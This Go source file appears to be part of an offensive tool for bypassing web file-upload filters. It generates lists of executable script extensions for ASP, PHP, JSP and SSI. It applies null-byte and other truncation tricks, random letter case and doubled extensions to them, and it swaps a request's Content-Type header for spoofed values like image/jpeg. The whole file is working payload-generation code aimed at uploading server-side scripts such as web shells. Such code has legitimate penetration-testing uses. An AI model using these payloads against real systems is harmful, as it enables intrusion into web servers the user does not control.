package main

import (
	"math/rand"
	"regexp"
	"strings"
	"time"
)

// 获取后缀
func Suffix(languag string) []string {
	var POCS []string
	//0:asp aspx  1:php  2:jsp   3:SSI
	suffix := [][]string{{"asp", "asa", "asax", "ascx", "cdx", "cer", "asmx", "aspx", "ashx", "soap"}, {"php", "phtml", "php2", "php3", "php4", "php5", "fuckyou", "php.fuck.you"}, {"jsp", "jspx", "war", "jspa", "jsw", "jsv", "jspf", "jhtml"}, {"stm", "shtm", "shtml"}}
	if languag == "p" {
		for _, v := range suffix[1] {
			POCS = append(POCS, v)
		}
	} else if languag == "a" {
		for _, v := range suffix[0] {
			POCS = append(POCS, v)
		}
	} else if languag == "j" {
		for _, v := range suffix[2] {
			POCS = append(POCS, v)
		}
	} else {
		for _, v := range suffix {
			for _, vv := range v {
				POCS = append(POCS, vv)
			}
		}
	}
	return POCS
}

// 文件名截断
func truncation(POCS []string) []string {
	var pocss []string
	symbol := []string{"%00", "%20", "%0a", `\r\n`, `\n`, ".", "::DATA", ";.jpg", "/1.jpg", `\\1.jpg`, ";", " ", ". ."}
	for _, v := range POCS {
		for _, vv := range symbol {
			pocss = append(pocss, v+vv)
		}
	}
	return pocss
}

// 后缀名大小写
func suffixCase(POCS []string) []string {
	var poscc []string
	rand.Seed(time.Now().UnixNano())
	for _, value := range POCS {
		randomCaseValue := randomizeCaseWithRequirements(value)
		//fmt.Println(value, randomCaseValue)
		poscc = append(poscc, randomCaseValue)
	}
	return poscc
}

func randomizeCaseWithRequirements(input string) string {
	for {
		randomCaseValue := randomizeCase(input)
		if checkLowerAndUpper(randomCaseValue) {
			return randomCaseValue
		}
	}
}

func randomizeCase(input string) string {
	result := make([]byte, len(input))

	for i := 0; i < len(input); i++ {
		// 随机生成 0 或 1，用于决定大小写转换
		randomCase := rand.Intn(2) // 0 或 1
		if randomCase == 0 {
			result[i] = byte(strings.ToUpper(string(input[i]))[0])
		} else {
			result[i] = byte(strings.ToLower(string(input[i]))[0])
		}
	}

	return string(result)
}

func checkLowerAndUpper(input string) bool {
	hasLower := false
	hasUpper := false

	for _, char := range input {
		if 'a' <= char && char <= 'z' {
			hasLower = true
		}
		if 'A' <= char && char <= 'Z' {
			hasUpper = true
		}
	}

	return hasLower && hasUpper
}

//后缀名大小写结束----------------------------------

// 文件名后缀双写-----------------------------
func doubleWriting(POCS []string) []string {
	var pocs []string
	for _, v := range POCS {
		pocs = append(pocs, insertString(v))
	}
	return pocs
}

func insertString(input string) string {
	rand.Seed(time.Now().UnixNano())
	randomIndex := rand.Intn(len(input) + 1) // 随机生成插入位置

	newString := insertSelf(input, randomIndex)
	return newString
}

func insertSelf(input string, index int) string {
	// 分割字符串为两部分
	part1 := input[:index]
	part2 := input[index:]

	// 拼接两部分和原始字符串
	newString := part1 + input + part2
	return newString
}

//文件名后缀双写-----------------------------

// 修改Content-Type
func modifyContent(input string) []string {
	var bodys []string
	search := "Content-Type"
	replacement := []string{"Content-Type: text/jsp", "Content-Type: text/jspx", "Content-Type: text/asp", "Content-Type: text/aspx", "Content-Type: text/php", "Content-Type: text/txt", "Content-Type: image/jpeg", "Content-Type: application/text", "Content-Type: application/zip", "Content-Type: text/plain"}
	lines := strings.Split(input, "\n")
	for _, v := range replacement {
		// 不区分大小写的正则表达式
		regex := regexp.MustCompile(`(?i)` + regexp.QuoteMeta(search))

		for i, line := range lines {
			if regex.MatchString(line) {
				lines[i] = v
			}
		}
		bodys = append(bodys, strings.Join(lines, "\n"))
	}
	//	fmt.Println(bodys)
	return bodys
}

// 修改Content-Type结束
